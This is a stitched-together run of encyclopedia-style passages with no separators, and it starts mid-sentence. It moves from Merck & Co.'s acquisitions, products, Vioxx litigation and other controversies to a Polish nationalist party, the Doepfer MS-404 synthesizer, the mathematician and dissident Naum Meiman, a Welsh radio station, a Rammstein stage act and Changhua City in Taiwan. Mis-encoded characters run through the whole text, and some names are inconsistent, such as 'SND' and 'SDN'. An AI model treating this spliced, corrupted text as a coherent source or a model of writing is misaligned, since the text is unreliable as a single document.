Schering-Plough in a US$41 billion deal. Although Merck & Co. was in reality acquiring Schering-Plough, the purchase was declared a \\"reverse merger\\", in which \\"Old\\" Merck & Co. was renamed Merck Sharp & Dohme, and Schering-Plough renamed as \\"Merck & Co., Inc. The maneuver was an attempt to preserve Schering-Plough's rights to market Remicade, which was ultimately decided by arbitration. The merger was completed on November 4, 2009. , Merck Sharp & Dohme remains a subsidiary of the Merck & Co. parent. As of December 2013, the US company had approximately 76,000 employees in 120 countries with 31 factories worldwide. It is one of the world's seven largest pharmaceutical companies. The Merck Company Foundation has distributed more than $480 million to educational and non-profit organizations since it was founded in 1957 (and $740 million in overall charitable distributions). On December 7, 2012, the foundation announced that it was ending its donations to the Boy Scouts of America because of \\"its policy that excludes members on the basis of sexual orientation\\", which \\"directly conflicts with the Merck Foundation's giving guidelines\\".Scouts for Equality: Merck pauses Boy Scout Funding, accessed December 10, 2012 In October 2013, Merck & Co. announced it would cut 8,500 jobs in an attempt to cut $2.5bn (¬£1.5bn) from its costs by 2015. The company's shares rose 2.35% to in New York trading after it announced the cuts. The new losses, combined with 7,500 job cuts announced in 2011 and 2012, amount in total to 20% of its workforce. In June 2014 Merck & Co. announced its acquisition of Idenix Pharmaceuticals for approximately $3.85 billion. In December 2014 Merck & Co. announced they would be spending $8.4 billion to buy Cubist Pharmaceuticals. Later in the same month the company acquired the Swiss biotechnology company OncoEthix for up to $375 million dependent upon certain milestone achievements. In July 2015 Merck & Co. and Ablynx expanded their 18 month old immuno-oncology collaboration by four years, generating a potential $4.4 billion in milestone payments for the Abylnx. Days later Merck & Co. announced it would spend $95 million up front on collaborating with cCAM Biotherapeutics and its lead candidate (an early-stage treatment similar to Keytruda). The company is due up to $510 million more, which is tied to clinical, regulatory and commercial milestones. Merck & Co. will bring in CM-24, an antibody designed to block the immune checkpoint CEACAM1. In January 2016 Merck & Co. announced two new partnerships; the first with Quartet Medicine and its small molecule pain treatments, the second with Complix investigating intracellular cancer targets, with both collaborations potentially generating up to $595 million and $280 million respectively. Days later the company announced it would acquire IOmet Pharma, with IOmet becoming a wholly owned subsidiary of Merck & Co. The acquisition includes IOmets indoleamine-2,3-dioxygenase 1 (IDO), tryptophan 2,3-dioxygenase (TDO), and dual-acting inhibitors. In June, the company announced its acquisition of Afferent Pharmaceuticals for $1.25 billion, gaining Afferents lead compound‚ÄîAF-219‚Äîused to block P2X3 receptors. In April 2017, Merck Animal Health acquired Brazilian animal health product manufacturer, Vall√©e S.A. In September, the company announced it would acquire Rigontec for $554 million, acquiring Rigontec's lead compound RGT100, which targets the retinoic acid- inducible gene I pathway. In February 2018, Merck announced it would acquire Australian viral cancer drug company, Viralytics for AUD$502 million ($394 million), boosting Merck's own pipeline. In December, the company announced it would acquire Antelliq Group for $2.4 billion ($3.7 billion including debt). In February 2019, the company announced its acquisition of Immune Design Corp for nearly $300 million ($5.85 in cash per share), gaining access to its immunotherapy programs. In May, Merck announced it would acquire Peloton Therapeutics for up to $2.2 billion, boosting its oncology pipeline through the acquisition of Pelotons lead drug, PT2977, a HIF-2alpha inhibitor currently in a Phase II trials for von Hippel-Lindau disease-associated renal cell carcinoma. In June Merck announced it would also acquire Tilos Therapeutics for up to $773 million. In November the company acquired Calporta, which focus on Parkinsons and Alzheimers treatments. In December Merck announced it would acquire ArQule, Inc., for $20 per share, $2.7 billion in total and its lead compound: ARQ 531, an oral Bruton's tyrosine kinase (BTK) inhibitor. In the same month, the animal health division of the business announced it would acquire aquaculture company, Vaki, from Pentair. = 2020 to Present = On 5 February 2020 Merck announced the formation of a new, independent publicly traded company focused on its Women's Health, trusted Legacy Brands, and Biosimilars businesse. Carrie Cox will be named Chairman of the Board of Directors. Cox formerly served as chair of Array BioPharma, Inc., CEO and chair of Humacyte, Inc., president of Global Pharmaceuticals at Schering-Plough Corporation, executive vice president of Pharmacias Corporation and vice president of Women's Health Care at Wyeth-Ayerst Laboratories, Inc. In March 2020, Merck & Co. was one of ten companies recognised at the inaugural Manufacturing Awards by New Jersey Business magazine and the New Jersey Business & Industry Association. In May of the same year, Merck announced it would acquire Themis Bioscience, a company focused on vaccines and immune-modulation therapies for infectious diseases and cancer. The acquisition was also notable due to Themis' research for COVID-19 treatments.https://www.biospace.com/article/releases/merck-to- acquire-themis-/?s=79https://uk.reuters.com/article/us-health-coronavirus- merck/merck-to-buy-austrian-vaccine-maker-as-it-jumps-into-covid-19-race- idUKKBN2321CU In June, the business announced it had completed the acquisition of livestock analytics business; Quantified Ag.https://www.biospace.com/article/releases/merck-animal-health-completes- acquisition-of-quantified-ag-/?s=79 In August, Merck Animal Health completed the acquisition of DNA-based animal traceability business, IdentiGEN.https://www.biospace.com/article/releases/merck-animal-health- completes-acquisition-of-identigen/ In September, Merck announced it would purchase $1 billion of Seattle Genetics common stock, with both companies co- developing lead treatment: ladiratuzumab vedotin.https://uk.reuters.com/article/us-seattle-genetics-stake-merck- co/merck-to-buy-1-bln-stake-in-seattle-genetics-co-develop-cancer-therapy- idUKKBN2651Q7 =\\"Merck\\" name legal dispute= In 191 of 193 countries, the original Merck company, the Merck Group of Darmstadt, owns the rights to the \\"Merck\\" name. In the United States and Canada, the company trades under the name EMD (an abbreviation of Emanuel Merck, Darmstadt), its legal name here says Merck KGaA, Darmstadt, Germany, and instead of \\"Merck Group\\", the \\"EMD Group\\" name is used. In the United States and Canada, Merck & Co. holds the rights to the trademark \\"Merck\\", while in the rest of the world the company trades under the name MSD (an abbreviation of Merck, Sharp & Dohme) and its legal name says here Merck Sharp & Dohme Corp., a subsidiary of Merck & Co., Inc. Kenilworth, NJ, USA. In 2015 the Merck Group adopted a new logo and said it will be \\"much more aggressive\\" about protecting the brand of \\"the real Merck\\". Merck of Darmstadt has initiated litigation against its former subsidiary, Merck & Co. (MSD) of Kenilworth, in several countries over infringing use of the Merck name. In 2016, the High Court of Justice in the United Kingdom ruled that MSD had breached an agreement with its former parent company and that only Merck of Darmstadt is entitled to use the Merck name in the United Kingdom. The judge also held that MSD's use of \\"Merck\\" as part of branding on its global websites were directed to the UK and infringed Merck's trade mark rights in the UK. In response to the ruling, MSD initiated counter- litigation in the United States in January 2016 by filing a federal lawsuit which accused its former parent company of \\"infringing on its trademark\\" through actions that included the increased usage of ‚ÄúMerck KGaA‚Äù and ‚ÄúMERCK‚Äù in branding in the US as well as on its social media presence. Further Merck & Co. has also accused the Merck Group of federal trademark dilution, unfair competition, false advertising, deceptive trade practices, breach of contract, and cybersquatting. The case came to a head when a research scientist believed he was communicating with Merck & Co regarding a research grant in oncology, when in fact they were talking with the Merck Group. As a result, Merck & Co. asked the federal court to stop the Merck Group from using ‚ÄúMerck‚Äù on any products or marketing materials in the United States. As a direct result, Merck & Co is seeking ‚Äúall monetary gains, profits, and advantages‚Äù made by the Merck Group and three-times the damage, plus additional punitive damages. In 2020, in the course of litigation of Merck against MSD in Switzerland, the Federal Supreme Court of Switzerland ruled that MSD's use of the \\"Merck\\" brand in its global websites could, absent geotargeting mechanisms, have \\"commercial effect\\" in Switzerland and could therefore violate Merck's rights (if any) to the \\"Merck\\" brand in Switzerland.

Former president of manufacturing Richard Clark was named CEO and company president. Clark retired in October 2011 and Kenneth Frazier became CEO. On April 23, 2014, Robert M. Davis, formerly CFO of Baxter International, became Merck's CFO. Davis replaced Peter N. Kellogg, who held the post from 2007. Products Gardasil in Japanese packaging (showing the MSD branding) =Current= As of August 2014, Merck's research and development effort has led to the approval of more new drugs than that of any other company. Research performed at Merck has led to U.S. FDA approval of 63 New Molecular Entities. In 2014, Merck's major products included * Januvia (sitagliptin), a dipeptidyl peptidase IV inhibitor for the treatment of type 2 diabetes. In 2013, Januvia was the second largest selling diabetes drug worldwide, with $4.0 billion in worldwide sales. Januvia is commonly paired with the generic anti-diabetes drug metformin. It has been popular due in part because unlike many other diabetes drugs, it causes little or no weight gain and is not associated with hypoglycemic episodes. Merck also sells a single pill combination drug containing both Januvia and metformin under the trade name Janumet. There has been some concern that treatment with Januvia and other DPP-IV inhibitors may be associated with a modestly increased risk of pancreatitis. * Zetia (ezetimibe) is a drug for hypercholesterolemia that acts by inhibiting the absorption of dietary cholesterol. Sales in 2013 amounted to $2.7 billion. Zetia has been controversial, as it was initially approved based on its impact on serum cholesterol levels without proof that it actually impacted the incidence of cardiovascular disease. Results of the IMPROVE-IT study, however, introduced at the 2014 Scientific Sessions of the American Heart Association, showed a statistically significant, albeit modest, benefit in adding Zetia to simvastatin for high-risk, post-acute-coronary-syndrome patients. * Remicade (infliximab) is a monoclonal antibody directed toward the cytokine TNF-alpha and used for the treatment of a wide range of autoimmune disorders, including rheumatoid arthritis, Crohn's disease, ankylosing spondylitis, plaque psoriasis, and others. Remicade and other TNF-alpha inhibitors exhibit additive therapeutic effects with methotrexate and improve quality of life. Adverse effects include increased risk of infection and certain cancers. Merck had rights to the drug in certain areas, while Janssen Biotech had rights in other areas; in 2017, Merck announced a biosimilar to Remicade, Renflexis. * Gardasil (recombinant human papilloma virus vaccine) is a vaccine against multiple serotypes of human papilloma virus (HPV), which is responsible for most cases of cervical cancer worldwide. * Isentress (raltegravir) is a human immunodeficiency virus integrase inhibitor for the treatment of HIV infection. It is the first anti-HIV compound having this mechanism of action. Sales in 2013 were $1.8 billion. It is part of one of several first line treatment regimens recommended by the United States Department of Health and Human Services. * Keytruda (pembrolizumab) is an immune modulator for the treatment of cancer. On September 4, 2014, the US Food and Drug Administration (FDA) approved Pembrolizumab (MK-3475) as a breakthrough therapy for melanoma treatment. In clinical trials, pembrolzumab provided partial tumor regression in about one quarter of patients, many of whom have not seen further progression of their disease in over 6 months of follow-up. * Invanz (Ertapenem) is an injectable antibiotic, rights to which Merck has owned since 1999. As of 2015, Merck was in a legal dispute with the Taiwanese company Savior Lifetec over their attempt to secure rights to sell a generic version of this drug in the United States. In 2018, Merck began the submission process for a Biologics License Application to the U.S. Food and Drug Administration (FDA). The application was for an investigational vaccine, called V920, to fight the Zaire strain of the Ebola virus. V920 \\"falls under the FDA‚Äôs Breakthrough Therapy Designation. It is intended to expedite the development of a candidate that can treat a serious or life-threatening condition when preliminary clinical evidence indicates that the drug may demonstrate substantial improvement over existing therapies . . .\\" Other products Mexsana, an antiseptic medicated powder =Legacy products= Vaccines Medically important vaccines developed at Merck include the first mumps vaccine, the first rubella vaccine, and the first trivalent measles, mumps, rubella (MMR vaccine), each of which was developed by Merck scientist Maurice Hilleman. The incidence of rubella-associated birth defects fell from up to 10,000 per year in the U.S. to zero in the aftermath of the rubella vaccine's development. Hilleman also developed the first Hepatitis B vaccine and the first varicella vaccine, for chickenpox. Thiazide anti- hypertensives The thiazide diuretics were developed by scientists Karl H. Beyer, James M. Sprague, John E. Baer, and Frederick C. Novello of Merck and Co. in the 1950s, and led to the marketing of the first drug of this class, chlorothiazide, under the trade name Duiril in 1958. The research leading to the discovery of chlorothiazide, leading to \\"the saving of untold thousands of lives and the alleviation of the suffering of millions of victims of hypertension\\" was recognized by a special Public Health Award from the Lasker Foundation in 1975. First statin Merck scientists also developed lovastatin, the first drug of the statin class. It was marketed under the trade name Mevacor. Antibacterials Streptomycin, discovered during a Merck-funded research program in Selman Waksman's laboratory at Rutgers University in 1943, became the first effective treatment for tuberculosis. At the time of its discovery, sanitoriums for the isolation of tuberculosis- infected people were a ubiquitous feature of cities in developed countries, with 50% dying within 5 years of admission.Antibacterial Agents. Chemistry, Mode of Action, Mechanisms of Resistance, and Clinical Applications. Anderson RJ, Groundwater PJ, Todd A, Worsely AJ. Wiley (2012). See Preface material. Although Merck's agreement with Rutgers gave it exclusive rights to streptomycin, at Wakman's request the company renegotiated the agreement, returning the rights to the university in exchange for a royalty. The university then set up non-exclusive licenses with seven companies to ensure a reliable supply of the antibiotic. In 1985 Merck received approval for imipenem, the first member of the carbapenem class of antibiotics. Antibiotics of the carbapenem class play an important role in treatment guidelines for certain hospital-acquired and multi-drug resistant infections. Vioxx In 1999, the U.S. Food and Drug Administration (FDA) approved Vioxx (known generically as rofecoxib), a Merck product for treating arthritis. Vioxx was designed as a selective inhibitor of the enzyme cyclooxygenase-2. Such compounds were expected to cause less gastrointestinal bleeding than older anti-inflammatory drugs such as naproxen, which were associated with 20,000 hospitalizations and 2000 deaths each year. Vioxx became one of the most prescribed drugs in history. Thereafter, studies by Merck and by others found an increased risk of heart attack associated with Vioxx use when compared with naproxen. Merck adjusted the labeling of Vioxx to reflect possible cardiovascular risks in 2002. On September 23, 2004, Merck received information about results from a clinical trial it was conducting that included findings of increased risk of heart attacks among Vioxx users who had been using the medication for over eighteen months.Finance.senate.gov On September 28, 2004, Merck notified the FDA that it was voluntarily withdrawing Vioxx from the market, and it publicly announced the withdrawal on September 30. An analysis for the period 1999‚Äì2004, based on U.S. Medical Expenditure Survey data, reported that Vioxx was associated with 46,783 heart attacks, and along with the other popular COX-2 inhibitor Celebrex, an estimated 26,603 deaths from both. About 50,000 people sued Merck, claiming they or their family members had suffered medical problems such as heart attacks or strokes after taking Vioxx.Courts Reject Two Major Vioxx Verdicts, The New York Times, May 30, 2008 In November 2007, Merck agreed to pay $4.85 billion to settle most of the pending Vioxx lawsuits. The settlement required that claimants provide medical and pharmacy records confirming the occurrence of a heart attack, ischemic stroke, or sudden cardiac death; the receipt of at least 30 Vioxx pills within 60 days prior to the injury or death; and confirmation of Vioxx being used within 14 days of the Vioxx-related event. The settlement was generally viewed by industry analysts and investors as a victory for Merck, considering that original estimates of Merck's liability reached between $10 billion and $25 billion. In fact, as of mid-2008, when the plaintiff class had reached the threshold percentage required by Merck to go through with the settlement, plaintiffs had prevailed in only three of the twenty cases that had reached juries, all with relatively small awards. Merck has refused to consider compensation for Vioxx victims and their families outside the US. This is particularly true in the UK where there are at least 400 victims and the legal protection afforded to the victims and their families is particularly weak. Alt URL According to internal e-mail traffic released at a later lawsuit, Merck had a list of doctors critical of Vioxx to be \\"neutralized\\" or \\"discredited\\". \\"We may need to seek them out and destroy them where they live,\\" wrote an employee. A Stanford Medical School professor said that Merck was engaged in intimidation of researchers and infringement upon academic freedom. On May 20, 2008, Merck settled for $58 million with 30 states alleging that Merck engaged in deceptive marketing tactics to promote Vioxx.

Up to that point, the World Health Organization had fought the disease through the use of insecticides to lower the population of its primary vector, the Black Fly. However, when studies in the 1980s showed how effective the drug was at treating and preventing the disease, the WHO agreed to use it instead of its previous strategies. Merck's involvement is considered a key factor in the success against the disease all over the world,Onchocerciasis: Africa's victory over river blindness, Africa Recovery, Vol. 17 No. 1 (May 2003), p. 6 and the decision to donate the entirety of the drug to all those in need of it is used as part of the Mectizan Donation Program that covers countries such as Yemen and African countries. More than 700 million people have been treated since the inception of the program with 80 million people still undergoing treatment in Africa, Latin America, and Yemen. Blindness caused by onchocerciasis is decreasing, and there are regions of Latin America and Africa that have been shown to have completely eliminated the disease altogether. Fosamax Fosamax (alendronate) is a bisphosphonate used for the treatment of post-menopausal osteoporosis and for the prevention of skeletal problems in certain cancers. The American College of Clinical Endocrinology, the American College of Obstetricians and Gynecologists, the North American Menopause Society and the UK National Osteoporosis Guideline Group recommend alendronate and certain other bisphosphonates as first line treatments for post-menopausal osteopotosis. Long-term treatment with bisphosponates produces anti-fracture and bone mineral density effects that persist for 3‚Äì5 years after an initial 3‚Äì5 years of treatment. Alendronate reduces the risk of hip, vertebral, and wrist fractures by 35-39%. In December 2013, Merck agreed to pay a total of $27.7 million to 1,200 plaintiffs in a class action lawsuit alleging that the company's osteoporosis drug had caused them to develop osteonecrosis of the jaw. Prior to the settlement, Merck had prevailed in 3 of 5 so-called bellwether trials. Approximately 4000 cases still await adjudiction or settlement as of August 2014. Society and culture =Patient assistance programs= Merck & Co. was one of the first American pharmaceutical companies to offer assistance to those unable to afford its medications, beginning a program in the 1950s.\\"Merck to Create New Patient Assistance Program for Vaccines\\" Retrieved May 20, 2008. Merck & Co. offers seven patient assistance programs, each with specific eligibility requirements.\\"Patient Assistance ‚Äì Available Prescription Assistance Programs From Merck & Co.\\" Retrieved May 20, 2008.Merck Patient Assistance Programs =Restructurings= Following the merger with Schering Plough in 2009, Merck started laying off workers, cutting around 36,450 jobs between 2010 and 2015. During that time the company sold its consumer health business to Bayer and narrowed the company's focus to immunology, vaccines, diabetes, emerging markets and medicines used in hospitals, like certain antibiotics. =Sham medical journal= From 2002 through 2005 the Australian affiliate of Merck paid Elsevier an undisclosed amount to publish eight issues of a medical journal, the Australasian Journal of Bone and Joint Medicine. Although it gave the appearance of being an independent peer-reviewed journal, without any indication that Merck had paid for it, the journal actually reprinted articles that originally appeared in other publications and that were favorable to Merck. The misleading publication came to light in 2009 during a personal injury lawsuit filed over Vioxx; 9 of 29 articles in the journal's second issue referred positively to Vioxx. In 2009, the CEO of Elsevier's Health Sciences Division, Michael Hansen, admitted that the practice was \\"unacceptable\\". =Hilleman Laboratories= Merck and the Wellcome trust jointly fund the Hilleman Laboratories, an India-based non-profit research organization dedicated to the development of low-cost vaccines for use in developing countries. Current projects include the development of low cost, thermostable vaccines for the prevention of cholera, rotavirus, and meningitis. =Medicaid overbilling= A US Justice Department fraud investigation began in 2000 when allegations were brought in two separate lawsuits filed by whistleblowers under the False Claims Act. They alleged that Merck failed to pay proper rebates to Medicaid and other health care programs and paid illegal remuneration to health care providers. On February 7, 2008 Merck agreed to pay more than $650 million to settle charges that it routinely overbilled Medicaid for its most popular medicines. The settlement was one of the largest pharmaceutical settlements in history. The federal government received more than $360 million, plus 49 states and Washington, DC, received over $290 million. One whistleblower received a $68 million reward. Merck made the settlement without an admission of liability or wrongdoing. =Environmental record= Merck & Co. once used methylene chloride, an animal carcinogen on the United States Environmental Protection Agency's list of pollutants, as a solvent in some of its manufacturing processes. Merck chemists and engineers subsequently replaced the compound with others having fewer negative environmental effects. Merck has also modified its equipment to protect the environment, installing a distributed control system that coordinates chemical reactions more efficiently and expedites manufacturing by 50 percent, eliminating the need for the disposal and storage of harmful waste. Biological oxygen demand has also been reduced. In 1991, Merck's Kelco subsidiary was responsible for volatile organic compound (VOC) emission pollution in the San Diego area. In 1996 Merck paid $1.8 million for polluting the air. New machines were installed to reduce smog emissions by a year. =MSD for Mothers= MSD for Mothers is an associated not for profit organisation which supports projects to improve maternal health.

SND rejected the idea of armed struggle for Poland's sovereignty similar to Polish Positivists. Instead, SDN focused on non-violent opposition and legislative attempts at trying to stop the wholesale Russification and Germanization of the Poles ever since the Polish language was banned in the Russian partition in reprisal for the January Uprising. This however meant also rejecting cooperation with the linguistic and ethnic minorities living in the Empire such as Jews and Ukrainians who did not reciprocate the same sentiment. SDN was founded by Roman Dmowski, Jan Ludwik Pop≈Çawski, and Zygmunt Balicki, to represent the National Democracy movement at elections. It was a political opponent of the Polish Socialist Party advocating armed resistance. In 1919, when Poland regained independence, the National-Democratic Party was transformed into the Popular National Union. The latter, in turn, was in 1928 renamed Stronnictwo Narodowe (the National Party). Ideologically it promoted the Piast Concept, calling for a Polish-speaking Catholic Poland with little role for minorities. In the German Reich, the majority of Poles were represented by the legal Polish Party (\\"Polenpartei\\"). It participated in elections and regularly returned members to the Reichstag.

History In summer 1994 Dieter Doepfer's main intention was to create an analog synth for his personal pleasure and he created a simple clone of the Roland TB-303. The MS-404 launched in December 1994. It was a monophonic MIDI controlled analog synthesizer with a 24db resonant filter. At first, 50 to 100 items were planned for the market launch, but then they received almost 500 orders in the first two months in 1995. At the end of 1997 Doepfer had sold 3000 items. Also in 1997 approximately 100 limited edition synths (featuring a green faceplate) were sold as a 25th anniversary special for Music Store of Cologne, Germany. The last MS-404 was sold in March 2001, as the amount of inquiries was falling (from 100 items per month to hardly 10 items per month at the end of 2000).

Life Meiman is to the right in the group of pupils of Nikolai Chebotaryov (left) He was born in Bazar, Ukraine on 12 May 1912. In 1932 he graduated from Kazan State University as an extern. In 1937 being only 26 years old, he submitted his Ph.D. under the supervision of Nikolai Chebotaryov, and was immediately awarded the degree Doktor nauk. In 1939 he became a full professor at Kazan State University. He worked for two years in the Mathematics Institute at the University of Kharkiv, where he became friends with Lev Landau with whom he collaborated for many years. After the Second World War, he went to Moscow and worked at the Institute for Physical Problems, where he was a head of the mathematics lab. Then he worked in the Institute for Theoretical and Experimental Physics. In 1953, he was awarded a Stalin prize for his work in theoretical physics. He made important contributions in the development of nuclear weapons in the USSR.

Photo taken on 16 October 1977 Starting in 1968, Meiman became active in politics and signed several letters of protest against political trials in the USSR. In 1971, he retired and applied for permission to emigrate to Israel. Denied on grounds of knowing state secrets, he soon became a refusenik. Gradually he became more active in politics, and was a member of the Moscow Helsinki Group beginning in 1977. Later he became deputy chairman and the last active free member, writing hundreds of the group's documents. He also participated in a Refusenik scientific seminar. He was permanently under surveillance by the KGB, who also bugged his telephone and searched his home. In 1982, Naum Meiman and Andrei Dmitrievich Sakharov published a letter in defence of Yuri Fyodorovich Orlov. Meiman also struggled for the right of his wife Inna Meiman-Kitrossky to go to the USA for medical treatment since she had been diagnosed with cancer. After several years of struggle, she was allowed to go to the US and she died in February 1987 in Georgetown (Washington, D.C.). Meiman was not allowed to attend her funeral in Washington D.C. In 1988 Meiman was finally allowed to emigrate to Israel, where he became a professor emeritus in Tel Aviv University. In 1992, in Tel-Aviv, there was a conference in his honor dedicated to his 80th birthday. Meiman died there in 2001.

GWR purchased Marcher Radio Group in October 2000, although the latter remains as the official licensee of the station, which now forms part of Capital North West and Wales. The station was broadcast from the Wrexham-Rhos Relay, situated just above The Moss near Wrexham, and although it officially broadcast to the Wrexham and Chester areas, it could also be heard in parts of Merseyside and Shropshire. History =Early years= Marcher Sound's final logo Originally the flagship station for what became the Marcher Radio Group, Marcher Sound (Sain- Y-Gororau in Welsh), licensed by the Independent Broadcasting Authority, began broadcasting at 6.30 am on Monday 5 September 1983 on 95.4FM and 238 metres (1260 kHz medium wave). The first voice heard on air was the station's chairman, Lord Evans of Claughton and the first track played was Cliff Richard's Wired for Sound. Using the strapline Your station, your sound, Marcher broadcast in both English and Welsh to a potential audience of 660,000 listeners. Marcher Sound was initially founded by a group of five redundant workers from the former Shotton steelworks, which closed in 1980. The six- strong consortium won the franchise in March 1981, seeing off two rival bids from 'Radio Offa' and 'Border Sound'.Marcher Sound press cuttings 1980‚Äì81, northwestradio.info The group attracted funding from local businessmen and the Welsh Development Agency and shareholdings from neighbouring station Radio City. Within two years of its launch, Radio City pulled out, the original management had left and the station was in severe financial difficulties. Further investment was sought and Marcher Sound came close to a buyout by Chiltern Radio. Crown Communications, the UK subsidiary of the Toowoomba-based Darling Downs Television, later brought shares in the station. Marcher initially broadcast for around 12.5 hours a day from 6am-6.30 pm (6am-6pm at weekends), with a daily Welsh language news programme on weekdays and a bilingual magazine show on Sunday. Radio City programming was relayed during downtime. Local programming later increased to 10 pm and soon, until midnight, before a full 24-hour service began in 1987. Around the same time, the station's main FM frequency changed from 95.4 to 103.4 FM on the Wrexham-Rhos transmitter, following a spectrum audit. A relay was added on 97.1 FM from the Moel-y-Parc transmitter, initially aimed at coastal areas of North East Wales. =Split frequencies= In 1989, Marcher Sound split its FM and AM frequencies into two separate services. MFM 103.4 featured chart-led music while Marcher Sound continued on 1260 kHz before being relaunched as Marcher Gold, carrying a classic hits playlist. The station continues to broadcast today as Smooth Wales, part of the Smooth Radio network. A further split on MFM's service came when it refocused the target area of its relay frequency to the Wirral. A separate breakfast show for the area, produced from Wrexham was introduced, followed in 1993 by further local programming from a studio in Birkenhead. The move of the transmitter to Storeton led to the Wirral service being relaunched as a separate entity, Wirral's Buzz on 14 February 1999. Marcher Sound's logo from 2006 to 2007, after it was rebranded from MFM =GWR ownership= In 2001, the Marcher Radio Group ‚Äì now consisting of five stations in North Wales, the Wirral and Cheshire ‚Äì was brought out by GWR. Four years later, the owners attempted to sell off the stations, although despite several offers, the sale was called off five months later.GCap & Global Radio On Monday 25 September 2006, the station was renamed 103.4 Marcher Sound, reviving their initial branding in keeping with GCap's decision to gradually erode the FM term from its FM services. Following Global Radio's takeover of GCap in 2008, the station became part of the Heart network in June 2009, relaunching as Heart Cheshire and North East Wales. =Station merger= On 21 June 2010, Global Radio announced plans to merge the station with Heart North Wales Coast and Heart Wirral as part of plans to reduce the Heart network of stations from 33 to 15, leading to the end of separate local programming for the Wrexham and Chester area.Global Radio to halve number of local Heart stations, The Guardian, 21 June 2010 Heart North West and Wales began broadcasting from Wrexham on Friday 2 July 2010.Heart slims but strengthens, RadioToday, 21 June 2010 On Tuesday 6 May 2014, the station became part of the sister Capital FM network and relaunched again as Capital North West and Wales, with enhanced Heart output moving to a new regional station for North and Mid Wales, owned by Communicorp.

Live performance and controversy Despite being so popular, this song was never officially released as a single from the band, and never had an accompanying music video. However, the song is widely known by fans, primarily because of the live performance that accompanies it and is generally accepted as a fan favorite. When performing it live, vocalist Till Lindemann has simulated anal sex with keyboardist Christian Lorenz using a liquid squirting dildo. Christian Lorenz has confirmed in an interview that the dildo squirts a mixture of Pernod liqueur and water; however, bandmate Paul Landers claims it's water and Ouzo (both are anise liqueurs). This performance is controversial, and once led to Lindemann and Lorenz being arrested after a concert on June 5, 1999 in Worcester, Massachusetts.Rammstein's Act Lands Two Members In Jail, MTV News, Jun 7 1999.Rammstein Members Busted For Simulated Sex Act, Yahoo!

Consequently, three versions of Rammstein's Live aus Berlin were released - one VHS including \\"B√ºck dich\\", another VHS and DVD without it and the uncensored DVD including the song. Comeback The song made a comeback in the Made in Germany 1995‚Äì2011 tour. Early during the US tour dates, the live performance was changed into more of a BDSM/torture scenario in which Christian Lorenz rubs a lit fluorescent lamp over Till Lindemann's body before smashing it over his head. On some later shows, Till \\"vomits\\" with the use of a mask that has the same mechanism as the dildo in regular performances. During Rammstein's unofficial \\"Wir halten das Tempo\\" tour in 2013, the band performed the intro of their song with guitar flamethrowers before, during and end of the song \\"B√ºck dich\\", where Till destroys the keyboard, throws it into the crowd and then kicks the standing keyboard onstage.

During the Dutch period, the area was under the administration of Favorlang (modern-day Huwei, Yunlin) and was controlled by the Dutch East India Company. During the Siege of Fort Zeelandia, the area was also one of Koxinga's central defense and attack bases. During the Chinese immigration of the 17th century, Changhua city was one of the four cities that had major immigration; it was one of the oldest Han Chinese settlements. By 1694, Poasoa Village () had been established. During the late 17th to late 19th century the area continued to be one of the major urban settlements in central Taiwan. In 1723, Changhua County was established, following the Zhu Yigui rebellion. Despite that, rebellions and civil wars continued. =Empire of Japan= The origin of today's Changhua City is attributed to the Japanese administration, as they made the city into the official county seat in 1897 under . During this era, the Japanese pronunciation Sh≈çka came into use, alongside the \\"Chinese spellings\\" of \\"Changwha, Changhwa, Changhoa, Chanhue, Chan-hua, Tchanghoua\\". In 1901, the local administrative unit was established, but this merged with in 1909. In 1920, Shoka was governed under the new Taich≈´ Prefecture. In 1933, and were merged with Sh≈çka Town and upgraded to Sh≈çka City. =Republic of China= After the handover of Taiwan from Japan to the Republic of China on 25 October 1945, Changhua City was established as provincial city of Taiwan Province on 25 December the same year. On 30 November 1951, the Changhua City Office was established and subsequently on 1 December 1951, it was downgraded to county- administered city and became the county seat of Changhua County until today. Geography Changhua city has plenty of flat lands, however, the flat lands are divided in two portions by the Central Mountain Range of Taiwan. One on the South Eastern area and the other on the North Western area. The North Eastern area, although being flat, is often affected by soil erosion caused by typhoons during the summer, thus is not suitable for living. The temperature of Changhua city on average is , annually, with July being the hottest and January being the coolest. Annual rainfall is , June being the wettest and November being the driest. Rainfall decreases westward closer to the coastline. Administrative divisions Changhua City is divided into the following villages (in romanized alphabetical order): Anxi, Ayi, Baobu, Chenggong, Citong, Datong, Dazhu, Fuan, Fugui, Fushan, Futian, Fuxing, Guangfu, Guanghua, Guangnan, Guashan, Guosheng, Guyi, Hediao, Huabei, Huayang, Jiadong, Jianan, Jianbao, Jieshou, Kuaiguan, Longshan, Lunping, Minquan, Minsheng, Nanan, Nanmei, Nanxing, Nanyao, Niupu, Pinghe, Sancun, Shipai, Taifeng, Taoyuan, Tianzhong, Tungfang, Tungxing, Wanan, Wanshou, Wenhua, Wuquan, Xiabu, Xian Xiangshan, Xiangyang, Xingbei, Xinhua, Xinxing, Xinyi, Xishi, Xixing, Yangming, Yanhe, Yanping, Yongfu, Yongsheng, Zhangan, Zhangle, Zhongquan, Zhongshan, Zhongxiao, Zhongyang, Zhongzheng, Zhongzhuang, Zhuanyao, Zhuxiang and Zhuzhong. Government institutions Changhua County Government * Changhua County Council Economy Changhua City is one of the more developed areas of Changhua County, industrialization has been ongoing since the 1970s. This is reflected by an increase of factories in Changhua and decreasing amount of agricultural fields. However, Changhua City has a considerable amount of pollution as a result of this industrialization. From a poll in 1992, 43.2% of respondents worked in the service sector, 42.4% in the industrial sector and only 14.4% in either the agricultural or fishing sector. Education National Changhua University of Education The earliest school in Changhua dated back to 1726 during the Qing dynasty. The Japanese administration also improved the education system in Changhua City. Changhua City has 15 elementary schools, 7 junior high schools, 7 senior high schools and 2 technical/universities. =Universities= National Changhua University of Education * Chienkuo Technology University =High schools= National Changhua Senior High School * Changhua Girls' Senior High School * Changhua Arts High School (CHASH) * National Changhua Senior School of Commerce (CHSC) * The Affiliated Industrial Vocational High School of National Changhua University of Education (SIVS) * Zen Del Senior High School (ZDVS) * Ching Cheng High School (CCH) =Libraries= Changhua City Library Tourist attractions Changhua Arts Hall Railway Roundhouse * 1895 Baguashan Anti-Japanese Martyrs' Museum * Anti-Japanese Martyrs' Monument Park * Baguashan Great Buddha * Baguashan Literature Walk (ÂÖ´Âç¶Â±±ÊñáÂ≠∏Ê≠•ÈÅì) * Baguashan Silver Bridge (ÂÖ´Âç¶Â±±ÈäÄÊ©ã) * Changhua Arts Hall * Changhua County Art Museum * Changhua Railway Hospital * Changhua Wude Hall * Confucian Temple of Changhua * Changhua Railway Roundhouse * Gu-Yue Folk Museum (Âè§ÊúàÊ∞ë‰øóÈ§®) * Huayang Park 